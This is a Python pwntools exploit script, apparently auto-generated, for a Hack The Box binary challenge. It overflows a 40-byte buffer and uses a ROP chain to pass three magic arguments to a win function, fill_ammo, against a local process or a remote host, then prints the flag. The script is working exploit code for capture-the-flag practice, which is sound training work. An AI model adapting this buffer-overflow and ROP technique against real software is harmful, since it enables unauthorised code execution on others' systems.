#!/usr/bin/env python3
# Argus-generated ret2win PoC scaffold
# Chain: chains.ret2win_rop_chain
# Binary: /mnt/d/Repos/Security/Argus/vulntest/validation/htb/tracks/binary_exploitation/extracted/a12c7380-1e06-401a-a27b-7c4db3087492/challenge/rocket_blaster_xxx
from pwn import *

context.arch = 'amd64'
context.log_level = 'warning'

fname = '/mnt/d/Repos/Security/Argus/vulntest/validation/htb/tracks/binary_exploitation/extracted/a12c7380-1e06-401a-a27b-7c4db3087492/challenge/rocket_blaster_xxx'

OVERFLOW_OFFSET = 40  # buf_frame_offset (Binja initial-RSP-relative)

def exploit(target):
    elf = ELF(fname, checksec=False)
    win = 0x4012f5  # fill_ammo
    rop     = ROP(elf)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
    pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]
    ret     = rop.find_gadget(['ret'])[0]

    chain  = b'A' * OVERFLOW_OFFSET
    chain += p64(pop_rdi) + p64(0xdeadbeef)  # pop rdi; ret + magic arg 0
    chain += p64(pop_rsi) + p64(0xdeadbabe)  # pop rsi; ret + magic arg 1
    chain += p64(pop_rdx) + p64(0xdead1337)  # pop rdx; ret + magic arg 2
    chain += p64(ret)  # SSE 16-byte stack alignment
    chain += p64(win)  # fill_ammo

    target.sendlineafter(b'>> ', chain)
    return target.recvall(timeout=3)

if __name__ == '__main__':
    import sys
    if len(sys.argv) >= 3:
        r = remote(sys.argv[1], int(sys.argv[2]))
    else:
        r = process(fname)
    out = exploit(r)
    flag = [l for l in out.decode(errors='replace').splitlines() if 'HTB' in l or 'flag' in l.lower()]
    print(flag[0] if flag else out[:200])
